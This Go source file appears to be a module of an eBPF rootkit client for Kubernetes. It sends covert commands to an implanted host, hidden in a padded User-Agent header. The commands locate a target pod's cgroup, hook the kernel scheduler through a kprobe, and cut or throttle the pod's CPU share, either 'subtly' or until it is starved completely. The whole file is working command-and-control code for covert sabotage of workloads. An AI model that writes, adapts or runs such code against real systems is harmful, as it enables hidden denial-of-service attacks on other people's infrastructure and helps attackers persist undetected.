package sched_starve

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type StarveResult struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, targetCgroup, intensity, output string) error {
	result := &StarveResult{}

	var actions []struct {
		name   string
		detail string
		cmd    string
	}

	switch intensity {
	case "low":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"identify_cgroup", "locate target pod cgroup via /sys/fs/cgroup hierarchy", "sched_find_cgroup"},
			{"attach_kprobe", "attach kprobe on pick_next_task_fair for target cgroup", "sched_attach"},
			{"reduce_weight", "reduce CFS weight by 25% to subtly degrade performance", "sched_weight_low"},
		}
	case "high":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"identify_cgroup", "locate target pod cgroup via /sys/fs/cgroup hierarchy", "sched_find_cgroup"},
			{"attach_kprobe", "attach kprobe on pick_next_task_fair for target cgroup", "sched_attach"},
			{"starve_cpu", "set CFS weight to minimum, starving target of CPU completely", "sched_weight_starve"},
			{"throttle_burst", "inject artificial throttle periods via cfs_bandwidth", "sched_throttle"},
		}
	default: // medium
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"identify_cgroup", "locate target pod cgroup via /sys/fs/cgroup hierarchy", "sched_find_cgroup"},
			{"attach_kprobe", "attach kprobe on pick_next_task_fair for target cgroup", "sched_attach"},
			{"reduce_weight", "reduce CFS weight by 50% causing noticeable degradation", "sched_weight_med"},
			{"inject_latency", "add scheduling latency via delayed wakeups", "sched_latency"},
		}
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + targetCgroup + "#" + intensity
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/sched_starve", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
